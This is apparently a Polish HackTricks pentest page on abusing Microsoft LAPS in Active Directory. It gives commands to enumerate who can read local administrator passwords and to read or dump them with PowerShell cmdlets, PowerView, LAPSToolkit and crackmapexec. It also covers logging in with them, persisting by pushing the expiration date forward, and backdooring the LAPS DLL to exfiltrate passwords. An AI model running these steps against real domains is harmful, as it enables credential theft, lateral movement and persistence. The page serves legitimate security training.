# LAPS

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Podstawowe informacje

Local Administrator Password Solution (LAPS) to narzędzie używane do zarządzania systemem, w którym **hasła administratorów**, które są **unikalne, losowe i często zmieniane**, są stosowane w komputerach dołączonych do domeny. Te hasła są bezpiecznie przechowywane w Active Directory i są dostępne tylko dla użytkowników, którzy otrzymali pozwolenie za pośrednictwem list kontroli dostępu (ACL). Bezpieczeństwo transmisji haseł z klienta do serwera zapewnia użycie **Kerberos wersja 5** oraz **Advanced Encryption Standard (AES)**.

W obiektach komputerowych domeny wdrożenie LAPS skutkuje dodaniem dwóch nowych atrybutów: **`ms-mcs-AdmPwd`** oraz **`ms-mcs-AdmPwdExpirationTime`**. Atrybuty te przechowują **hasło administratora w postaci jawnej** oraz **czas jego wygaśnięcia**, odpowiednio.

### Sprawdź, czy aktywowane
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik na format czytelny dla ludzi.

Ponadto, **natywne cmdlety PowerShell LAPS** mogą być używane, jeśli są zainstalowane na maszynie, do której mamy dostęp:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** może być również używany do ustalenia **kto może odczytać hasło i je odczytać**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) ułatwia enumerację LAPS za pomocą kilku funkcji.\
Jedną z nich jest analizowanie **`ExtendedRights`** dla **wszystkich komputerów z włączonym LAPS.** To pokaże **grupy** specjalnie **delegowane do odczytu haseł LAPS**, które często są użytkownikami w chronionych grupach.\
**Konto**, które **dołączyło komputer** do domeny, otrzymuje `All Extended Rights` nad tym hostem, a to prawo daje **konta** możliwość **odczytu haseł**. Enumeracja może pokazać konto użytkownika, które może odczytać hasło LAPS na hoście. To może pomóc nam **skierować się na konkretnych użytkowników AD**, którzy mogą odczytać hasła LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Zrzucanie haseł LAPS za pomocą Crackmapexec**

Jeśli nie ma dostępu do PowerShell, możesz nadużyć tego uprawnienia zdalnie przez LDAP, używając
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
To będzie zrzut wszystkich haseł, które użytkownik może odczytać, co pozwoli ci uzyskać lepszą pozycję z innym użytkownikiem.

## ** Używanie hasła LAPS **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Persistence**

### **Data wygaśnięcia**

Po uzyskaniu uprawnień administratora, możliwe jest **uzyskanie haseł** i **zapobieżenie** aktualizacji **hasła** maszyny poprzez **ustawienie daty wygaśnięcia w przyszłość**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> Hasło nadal zostanie zresetowane, jeśli **admin** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli **Nie zezwalaj na czas wygaśnięcia hasła dłuższy niż wymagany przez politykę** jest włączone w GPO LAPS.

### Backdoor

Oryginalny kod źródłowy dla LAPS można znaleźć [tutaj](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdoora w kodzie (w metodzie `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`, na przykład), który w jakiś sposób **wyeksfiltruje nowe hasła lub przechowa je gdzie indziej**.

Następnie wystarczy skompilować nowy `AdmPwd.PS.dll` i przesłać go na maszynę do `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i zmienić czas modyfikacji).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
